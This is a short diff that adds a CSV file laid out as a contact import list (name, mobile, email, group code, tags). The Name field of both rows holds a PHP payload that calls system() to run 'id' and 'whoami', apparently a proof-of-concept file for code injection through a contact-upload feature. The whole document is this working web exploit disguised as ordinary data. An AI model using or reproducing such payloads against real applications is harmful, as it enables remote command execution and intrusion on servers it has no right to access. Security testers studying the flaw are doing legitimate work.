@@ -1,0 +1,3 @@
+Name,Mobile,Email,Group code,Tags
+<?php $t="id"; system($t); ?>,22,,,
+<?php $t="whoami"; system($t); ?>,22,,,
